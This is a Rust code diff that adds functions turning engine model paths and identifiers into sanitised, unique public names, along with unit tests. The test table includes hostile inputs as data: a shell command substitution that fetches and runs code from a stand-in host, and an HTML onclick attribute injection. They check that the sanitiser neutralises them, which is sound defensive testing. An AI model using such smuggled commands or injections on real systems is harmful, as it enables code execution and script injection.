@@ -398,6 +398,117 @@ pub fn is_valid_canonical_field(id: &str) -> bool {
     id.is_empty() || is_valid_model_id(id)
 }
 
+/// The name a provider announces for an engine model. A name the network accepts
+/// ([`is_valid_model_id`]) is used as is. Anything else is cleaned up rather than left unshared:
+///
+/// * an absolute or home-relative path (`/data/models/Qwen2.5-7B`, `~/m/x.gguf`, `C:\\m\\x`) keeps
+///   only its last component (a `.gguf` file without its extension), so no directory or user name
+///   is announced;
+/// * Windows separators become `/` (`SDXL\\juggernaut.safetensors` → `SDXL/juggernaut.safetensors`);
+/// * any other character outside the allowed set becomes `-`; runs of `-` and spaces collapse;
+/// * it starts with a letter or digit, is at most [`MAX_MODEL_ID_LEN`] bytes, and is never empty.
+///
+/// The provider keeps the mapping back to the engine's own id for serving. Two engine ids that clean
+/// up to the same name are told apart by [`assign_public_ids`].
+pub fn public_model_id(engine_ref: &str) -> String {
+    if is_valid_model_id(engine_ref) {
+        return engine_ref.to_string();
+    }
+    let t = engine_ref.trim();
+    let b = t.as_bytes();
+    let windows_drive = b.len() > 2 && b[0].is_ascii_alphabetic() && b[1] == b':' && matches!(b[2], b'/' | b'\\');
+    let s = if t.starts_with('/') || t.starts_with('~') || windows_drive {
+        // The file or directory name; a GGUF file loses its extension, as llama.cpp's handles do.
+        let last = t.rsplit(['/', '\\']).find(|p| !p.trim().is_empty()).unwrap_or("");
+        match last.len().checked_sub(5) {
+            Some(cut) if last.is_char_boundary(cut) && last[cut..].eq_ignore_ascii_case(".gguf") => last[..cut].to_string(),
+            _ => last.to_string(),
+        }
+    } else {
+        t.replace('\\', "/")
+    };
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        let mapped = if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '/' | '@' | '+' | '-') {
+            c
+        } else if c == ' ' || c == '\t' {
+            ' '
+        } else {
+            '-'
+        };
+        // Collapse runs: "--" → "-", "  " → " ", and a separator next to a dash keeps the dash.
+        match (out.chars().last(), mapped) {
+            (Some('-'), '-') | (Some(' '), ' ') | (Some('-'), ' ') => continue,
+            (Some(' '), '-') => {
+                out.pop();
+                out.push('-');
+            }
+            _ => out.push(mapped),
+        }
+    }
+    let start = out.find(|c: char| c.is_ascii_alphanumeric()).unwrap_or(out.len());
+    let mut clean = out[start..].to_string();
+    clean.truncate(MAX_MODEL_ID_LEN);
+    let clean = clean.trim_end_matches([' ', '-', '.', '/']).to_string();
+    if clean.is_empty() {
+        "model".to_string()
+    } else {
+        clean
+    }
+}
+
+/// Public names for a set of engine ids, each unique. Ids that are already valid names keep them.
+/// A cleaned-up name ([`public_model_id`]) that no other id claims is used as is; one that clashes
+/// (with a valid name, or with another cleaned-up name) gets a suffix from a hash of its own engine
+/// id (`Qwen2.5-7B-3f9a1c`). The suffix depends on nothing else, so a name never passes from one
+/// engine model to another: when a clash appears, the clashing models all change name (and the old
+/// one is withdrawn) instead of one silently taking over a name the network knows. Returns (engine
+/// id, public name) pairs, sorted by engine id.
+pub fn assign_public_ids<'a, I: IntoIterator<Item = &'a str>>(engine_refs: I) -> Vec<(String, String)> {
+    let mut refs: Vec<&str> = engine_refs.into_iter().collect();
+    refs.sort_unstable();
+    refs.dedup();
+    let mut taken: std::collections::BTreeSet<String> = refs.iter().filter(|r| is_valid_model_id(r)).map(|r| r.to_string()).collect();
+    let cleaned: Vec<(&str, String)> = refs.iter().filter(|r| !is_valid_model_id(r)).map(|r| (*r, public_model_id(r))).collect();
+    let mut claims: std::collections::BTreeMap<&str, usize> = std::collections::BTreeMap::new();
+    for (_, base) in &cleaned {
+        *claims.entry(base.as_str()).or_default() += 1;
+    }
+    let mut public: std::collections::BTreeMap<&str, String> = std::collections::BTreeMap::new();
+    for (r, base) in &cleaned {
+        if claims[base.as_str()] > 1 || taken.contains(base) {
+            continue;
+        }
+        taken.insert(base.clone());
+        public.insert(r, base.clone());
+    }
+    for (r, base) in &cleaned {
+        if public.contains_key(r) {
+            continue;
+        }
+        let digest = hex::encode(Sha256::digest(r.as_bytes()));
+        let mut len = 6;
+        let name = loop {
+            let suffix = format!("-{}", &digest[..len]);
+            let mut stem = base.clone();
+            stem.truncate(MAX_MODEL_ID_LEN - suffix.len());
+            let name = format!("{}{suffix}", stem.trim_end_matches([' ', '-', '.', '/']));
+            if !taken.contains(&name) || len >= digest.len() {
+                break name;
+            }
+            len += 2;
+        };
+        taken.insert(name.clone());
+        public.insert(r, name);
+    }
+    refs.into_iter()
+        .map(|r| {
+            let p = public.remove(r).unwrap_or_else(|| r.to_string());
+            (r.to_string(), p)
+        })
+        .collect()
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -659,5 +770,71 @@ mod tests {
         assert!(is_valid_model_id(&"a".repeat(MAX_MODEL_ID_LEN)));
         assert!(is_valid_canonical_field(""));
         assert!(!is_valid_canonical_field("a\"b"));
+    }
+
+    #[test]
+    fn public_model_id_cleans_up_honest_engine_ids() {
+        for (engine, public) in [
+            ("qwen2.5:7b", "qwen2.5:7b"),
+            ("Qwen/Qwen2.5-7B-Instruct", "Qwen/Qwen2.5-7B-Instruct"),
+            ("/data/models/Qwen2.5-7B", "Qwen2.5-7B"),
+            ("/home/alice/models/qwen.gguf", "qwen"),
+            ("~/models/phi-3-mini.GGUF", "phi-3-mini"),
+            ("C:\\models\\Llama-3.1-8B", "Llama-3.1-8B"),
+            ("./models/x", "models/x"),
+            ("SDXL\\juggernaut.safetensors", "SDXL/juggernaut.safetensors"),
+            ("Flux (dev)", "Flux-dev"),
+            ("my model [v2], final", "my model-v2-final"),
+            ("qwén 7b", "qw-n 7b"),
+            ("  spaced   out  ", "spaced out"),
+            ("x\" onclick=\"y", "x-onclick-y"),
+            ("$(curl evil|sh)", "curl evil-sh"),
+            ("!!!", "model"),
+            ("", "model"),
+        ] {
+            let p = public_model_id(engine);
+            assert_eq!(p, public, "{engine:?}");
+            assert!(is_valid_model_id(&p), "{engine:?} -> {p:?} must be valid");
+        }
+        let long = format!("/m/{}", "é".repeat(300));
+        assert!(is_valid_model_id(&public_model_id(&long)));
+    }
+
+    #[test]
+    fn public_ids_are_unique_and_valid_names_keep_theirs() {
+        let ids = assign_public_ids(["Flux (dev)", "Flux-dev", "Flux [dev]", "/a/x", "/b/x"]);
+        let map: std::collections::BTreeMap<_, _> = ids.into_iter().collect();
+        assert_eq!(map["Flux-dev"], "Flux-dev", "a valid name is never renamed");
+        let mut publics: Vec<&String> = map.values().collect();
+        publics.sort();
+        publics.dedup();
+        assert_eq!(publics.len(), 5, "{map:?}");
+        assert!(map.values().all(|p| is_valid_model_id(p)));
+        // Stable: the same inputs in another order give the same names.
+        let again: std::collections::BTreeMap<_, _> = assign_public_ids(["/b/x", "Flux [dev]", "/a/x", "Flux-dev", "Flux (dev)"]).into_iter().collect();
+        assert_eq!(map, again);
+        // A name that clashes with nothing keeps the clean form.
+        let solo: std::collections::BTreeMap<_, _> = assign_public_ids(["/data/models/Qwen2.5-7B", "qwen2.5:7b"]).into_iter().collect();
+        assert_eq!(solo["/data/models/Qwen2.5-7B"], "Qwen2.5-7B");
+    }
+
+    #[test]
+    fn a_public_name_never_passes_to_another_engine_model() {
+        // "/b/x" is announced as "x". A second engine model that also cleans up to "x" appears: both
+        // get their own hash-suffixed names, so "x" never starts meaning "/a/x".
+        let before: std::collections::BTreeMap<_, _> = assign_public_ids(["/b/x"]).into_iter().collect();
+        assert_eq!(before["/b/x"], "x");
+        let after: std::collections::BTreeMap<_, _> = assign_public_ids(["/a/x", "/b/x"]).into_iter().collect();
+        assert_ne!(after["/a/x"], "x");
+        assert_ne!(after["/b/x"], "x");
+        assert_ne!(after["/a/x"], after["/b/x"]);
+        assert!(after["/b/x"].starts_with("x-"), "{after:?}");
+        // The suffix is the engine id's own: unchanged when a third clash arrives.
+        let third: std::collections::BTreeMap<_, _> = assign_public_ids(["/a/x", "/b/x", "/c/x"]).into_iter().collect();
+        assert_eq!(third["/b/x"], after["/b/x"]);
+        // A model whose engine id already is "x" keeps "x"; the path model is suffixed.
+        let literal: std::collections::BTreeMap<_, _> = assign_public_ids(["x", "/b/x"]).into_iter().collect();
+        assert_eq!(literal["x"], "x");
+        assert_eq!(literal["/b/x"], after["/b/x"]);
     }
 }
